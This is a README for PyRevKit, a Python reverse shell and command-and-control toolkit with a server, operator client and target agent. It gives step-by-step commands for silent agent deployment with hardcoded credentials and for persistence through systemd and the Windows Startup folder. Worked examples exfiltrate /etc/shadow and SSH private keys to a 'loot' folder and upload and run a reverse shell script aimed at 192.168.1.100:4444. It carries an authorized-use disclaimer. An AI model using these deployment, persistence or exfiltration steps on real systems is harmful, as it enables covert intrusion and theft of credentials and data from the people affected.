# PyRevKit

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey)](https://github.com/yourusername/pyrevkit)

A powerful, secure reverse shell toolkit with encrypted WebSocket communication, file transfer capabilities, and authentication system.

## 🎯 Features

- **🔐 Secure Communication**: TLS/SSL encrypted WebSocket connections
- **🔑 Authentication**: PBKDF2-SHA256 hashed credentials with salting
- **📁 File Transfer**: Bidirectional file upload/download with base64 encoding
- **🔄 Auto-Reconnection**: Exponential backoff retry mechanism
- **🎭 Persistent Targets**: Targets remain connected between operator sessions
- **🤖 Autonomous Deployment**: Pre-configured credentials for silent deployment
- **📊 Multi-Session**: Multiple operators can connect to the same target sequentially
- **🛡️ Safe Execution**: Command timeout protection (30s default)

## 📋 Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Usage](#usage)
  - [Server Setup](#server-setup)
  - [Target Deployment](#target-deployment)
  - [Client Connection](#client-connection)
  - [File Transfer Commands](#file-transfer-commands)
- [Examples](#examples)
- [Configuration](#configuration)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

## 🚀 Installation

### Requirements

- Python 3.7 or higher
- `websockets` library

### Linux / macOS

```bash
# Clone the repository
git clone https://github.com/yourusername/pyrevkit.git
cd pyrevkit

# Install dependencies
pip3 install websockets

# Or using requirements.txt
pip3 install -r requirements.txt

# Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -nodes \
  -out server.pem -keyout server.pem -days 365 \
  -subj "/CN=YOUR_SERVER_IP"
```

### Windows

```powershell
# Clone the repository
git clone https://github.com/yourusername/pyrevkit.git
cd pyrevkit

# Install dependencies
pip install websockets

# Or using requirements.txt
pip install -r requirements.txt

# Generate SSL certificate (requires OpenSSL for Windows)
openssl req -x509 -newkey rsa:4096 -nodes -out server.pem -keyout server.pem -days 365
```

### Docker (Optional)

```bash
docker build -t pyrevkit .
docker run -d -p 8765:8765 --name pyrevkit-server pyrevkit
```

## ⚡ Quick Start

### 1. Setup Credentials

```bash
# Add operator credentials
python pyrev_server.py -creds operator admin SecurePassword123!

# Add target credentials
python pyrev_server.py -creds target machineA TargetPassword456!
```

### 2. Start the Server

```bash
python pyrev_server.py
```

Output:
```
[+] Directories ready: loot/, payloads/
[+] Server running on wss://0.0.0.0:8765
[+] Credentials file: credentials.json
[+] Loot directory: loot/
[+] Payloads directory: payloads/
```

### 3. Connect a Target

```bash
python pyrev_target.py
```

Interactive mode:
```
Server host [192.168.2.110]: 
Server port [8765]: 
--- Authentication ---
Login: machineA
Password: [hidden]
[+] Connected and authenticated. Waiting for commands...
```

### 4. Connect as Operator

```bash
python pyrev_client.py
```

```
--- Authentication ---
Login: admin
Password: [hidden]
[+] Connected to server
Target ID: machineA
[+] Interactive session started
>>> whoami
root
>>> 
```

## 🏗️ Architecture

```
┌─────────────────┐         ┌────────────────┐         ┌────────────────┐
│     Operator    │         │   C2 Server    │         │     Target     │
│                 │◄───────►│   - Auth       │◄───────►│                |
│                 │  WSS    │   - Relay      │  WSS    │                │
│  pyrev_client   │         │   - Files      │         │  pyrev_target  │
└─────────────────┘         │                │         └────────────────┘
                            |  pyrev_server  |
                            └────────────────┘
                                     │
                              ┌──────┴──────┐
                              │             │
                            loot/       payloads/
```

### Components

- **pyrev_server.py**: Central C2 server handling authentication, relay, and file operations
- **pyrev_client.py**: Operator interface for sending commands and managing files
- **pyrev_target.py**: Agent deployed on target machines

### File Structure

```
pyrevkit/
├── pyrev_server.py          # C2 Server
├── pyrev_client.py          # Operator client
├── pyrev_target.py          # Target agent
├── requirements.txt         # Python dependencies
├── server.pem              # SSL certificate (generated)
├── credentials.json        # Hashed credentials (auto-created)
├── loot/                   # Downloaded files from targets
└── payloads/               # Files to upload to targets
```

## 📖 Usage

### Server Setup

#### Start Server

```bash
python pyrev_server.py [OPTIONS]
```

**Options:**
- `-creds ROLE LOGIN PASSWORD` - Add/update credentials
- `-host HOST` - Server host (default: 0.0.0.0)
- `-port PORT` - Server port (default: 8765)
- `-cert FILE` - SSL certificate file (default: server.pem)

**Examples:**

```bash
# Add operator
python pyrev_server.py -creds operator alice MyPass123

# Add target
python pyrev_server.py -creds target prod-web-01 TargetPass456

# Start on custom port
python pyrev_server.py -host 0.0.0.0 -port 9000
```

#### Credential Management

Credentials are stored in `credentials.json` with PBKDF2-SHA256 hashing:

```json
{
  "operator": {
    "admin": {
      "hash": "0b2ad92a1f3e68487a780b3c6d7ab33c...",
      "salt": "e48cbd452e38b9337130dcb82f3b761c..."
    }
  },
  "target": {
    "machineA": {
      "hash": "f61a20f536c15913156a282b3eb84b03...",
      "salt": "ff789cd49679ebadd2f60b02094ae21b..."
    }
  }
}
```

### Target Deployment

#### Interactive Mode

```bash
python pyrev_target.py
```

The script will prompt for:
- Server host
- Server port
- Login credentials

#### Autonomous Mode (Silent Deployment)

Edit the configuration section in `pyrev_target.py`:

```python
# ========== CONFIGURATION ==========
TARGET_ID = "machineA"
SERVER_HOST = "192.168.2.110"
SERVER_PORT = 8765

AUTO_LOGIN = "machineA"           # Fill for auto-connect
AUTO_PASSWORD = "TargetPass456"   # Fill for auto-connect
# ====================================
```

Then simply run:

```bash
python pyrev_target.py
```

Output:
```
[+] Auto-connecting to 192.168.2.110:8765 as machineA
[+] Connected and authenticated. Waiting for commands...
```

**Persistence Examples:**

Linux (systemd):
```bash
sudo nano /etc/systemd/system/pyrevkit.service
```

```ini
[Unit]
Description=PyRevKit Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/pyrevkit/pyrev_target.py
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable pyrevkit
sudo systemctl start pyrevkit
```

Windows (Startup):
```batch
# Add to: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pyrevkit.bat
@echo off
cd C:\Tools\pyrevkit
python pyrev_target.py
```

### Client Connection

```bash
python pyrev_client.py
```

**Session Flow:**

1. Enter server connection details
2. Authenticate with operator credentials
3. Specify target ID to connect to
4. Interactive command prompt

```
>>> help
```

### File Transfer Commands

#### Download Files from Target

```bash
>>> download /etc/passwd
[*] Requesting download: /etc/passwd
[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
```

**Features:**
- Automatic renaming with target prefix
- Size display
- Max file size: 10MB
- Supports absolute and relative paths

#### Upload Files to Target

```bash
>>> upload exploit.sh
[*] Uploading: exploit.sh
[✓] Saved exploit.sh (5.67 KB) → downloads/exploit.sh
```

Files are uploaded from the server's `payloads/` directory to the target's `downloads/` folder.

#### List Files

```bash
# List downloaded files (server-side)
>>> ls_loot
Files in loot/:
  - machineA_passwd (2.45 KB)
  - machineA_config.txt (1.23 KB)

# List available payloads
>>> ls_payloads
Files in payloads/:
  - exploit.sh (5.67 KB)
  - payload.exe (234.56 KB)
```

#### All Available Commands

| Command | Description | Example |
|---------|-------------|---------|
| `<command>` | Execute shell command | `whoami`, `ls -la` |
| `download <file>` | Download file from target | `download /etc/shadow` |
| `upload <file>` | Upload file to target | `upload payload.exe` |
| `ls_loot` | List downloaded files | `ls_loot` |
| `ls_payloads` | List available payloads | `ls_payloads` |
| `help` | Show help message | `help` |
| `exit` / `quit` | Disconnect from target | `exit` |

## 💡 Examples

### Example 1: Basic Reconnaissance

```bash
>>> whoami
root

>>> uname -a
Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

>>> pwd
/root

>>> ls -la
total 48
drwx------  5 root root 4096 Apr  3 10:30 .
drwxr-xr-x 19 root root 4096 Mar 15 08:12 ..
-rw-------  1 root root  220 Mar 15 08:12 .bash_logout
```

### Example 2: Data Exfiltration

```bash
>>> download /etc/passwd
[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd

>>> download /etc/shadow
[✓] Downloaded shadow (1.89 KB) → loot/machineA_shadow

>>> download /home/user/.ssh/id_rsa
[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa

>>> ls_loot
Files in loot/:
  - machineA_passwd (2.45 KB)
  - machineA_shadow (1.89 KB)
  - machineA_id_rsa (3.24 KB)
```

### Example 3: Payload Deployment

```bash
>>> ls_payloads
Files in payloads/:
  - reverse_shell.sh (265 bytes)
  - privilege_escalation.py (3.21 KB)

>>> upload reverse_shell.sh
[✓] Saved reverse_shell.sh (0.26 KB) → downloads/reverse_shell.sh

>>> chmod +x downloads/reverse_shell.sh

>>> bash downloads/reverse_shell.sh 192.168.1.100 4444
```

### Example 4: Multi-Session Workflow

Terminal 1 (Server):
```bash
$ python pyrev_server.py
[+] Server running on wss://0.0.0.0:8765
[+] Target machineA connected
```

Terminal 2 (Target):
```bash
$ python pyrev_target.py
[+] Auto-connecting to 192.168.2.110:8765 as machineA
[+] Connected and authenticated. Waiting for commands...
```

Terminal 3 (Operator 1):
```bash
$ python pyrev_client.py
>>> whoami
root
>>> exit
```

Terminal 4 (Operator 2 - connects to same target):
```bash
$ python pyrev_client.py
>>> pwd
/root
```

## ⚙️ Configuration

### Server Configuration

Edit `pyrev_server.py` constants:

```python
LOOT_DIR = "loot"           # Directory for downloaded files
PAYLOADS_DIR = "payloads"   # Directory for payloads to upload
CREDS_FILE = "credentials.json"
```

### Target Configuration

Edit `pyrev_target.py` header:

```python
TARGET_ID = "machineA"        # Unique identifier
SERVER_HOST = "192.168.2.110" # C2 server address
SERVER_PORT = 8765            # C2 server port
AUTO_LOGIN = ""               # Set for autonomous mode
AUTO_PASSWORD = ""            # Set for autonomous mode
DOWNLOAD_DIR = "downloads"    # Received files directory
```

### Client Configuration

Edit `pyrev_client.py` constants:

```python
OP_ID = "operator1"  # Operator identifier
```

## 🔒 Security Considerations

### ⚠️ Important Warnings

1. **For Educational/Authorized Use Only**: Only use on systems you own or have explicit permission to test
2. **Credential Storage**: Passwords are hashed but stored on disk
3. **SSL Certificate**: Use valid certificates in production
4. **Network Security**: Consider firewall rules and network segmentation

### Security Features

✅ **TLS/SSL Encryption**: All traffic encrypted via WSS  
✅ **Password Hashing**: PBKDF2-SHA256 with 100,000 iterations  
✅ **Salt per User**: Unique 32-byte salt prevents rainbow tables  
✅ **Timing Attack Protection**: Constant-time comparison  
✅ **Command Timeout**: 30-second limit on command execution  
✅ **File Size Limits**: 10MB maximum file transfer size  

### Recommendations

- Use strong, unique passwords (16+ characters)
- Rotate credentials regularly
- Use firewall rules to restrict server access
- Monitor server logs for suspicious activity
- Use valid SSL certificates (not self-signed) in production
- Set restrictive file permissions: `chmod 600 credentials.json`

## 🐛 Troubleshooting

### Connection Issues

**Problem**: `[ERROR] Connection rejected`

**Solution**:
```bash
# Verify server is running
netstat -tulpn | grep 8765

# Check firewall
sudo ufw allow 8765/tcp

# Verify certificate exists
ls -l server.pem
```

**Problem**: `cannot call recv while another coroutine is running`

**Solution**: Server automatically handles this by cancelling old relays. Update to latest version.

### Authentication Issues

**Problem**: `Authentication failed`

**Solution**:
```bash
# Verify credentials exist
cat credentials.json

# Re-add credentials
python pyrev_server.py -creds target machineA NewPassword123

# Check for typos in login/password
```

### File Transfer Issues

**Problem**: `[✗] File not found`

**Solution**:
```bash
# For download: verify file exists on target
>>> ls /path/to/file

# For upload: verify file in payloads/
ls -l payloads/
```

**Problem**: `[✗] File too large`

**Solution**: Files over 10MB are rejected. Compress or split the file:
```bash
# On target
tar -czf archive.tar.gz large_directory/
>>> download archive.tar.gz
```

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚖️ Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this program. Use responsibly and only on systems you own or have explicit permission to test.

## 📚 Additional Resources

- [PBKDF2 Specification](https://tools.ietf.org/html/rfc2898)
- [WebSocket Protocol](https://tools.ietf.org/html/rfc6455)
- [TLS Best Practices](https://wiki.mozilla.org/Security/Server_Side_TLS)

## 🙏 Acknowledgments

- Built with Python's `asyncio` and `websockets` libraries
- Inspired by modern C2 frameworks
- Thanks to the security research community

---

**⭐ If you find this project useful, please consider giving it a star!**

**📧 Contact**: your.email@example.com  
**🐛 Issues**: [GitHub Issues](https://github.com/yourusername/pyrevkit/issues)  
**💬 Discussions**: [GitHub Discussions](https://github.com/yourusername/pyrevkit/discussions)
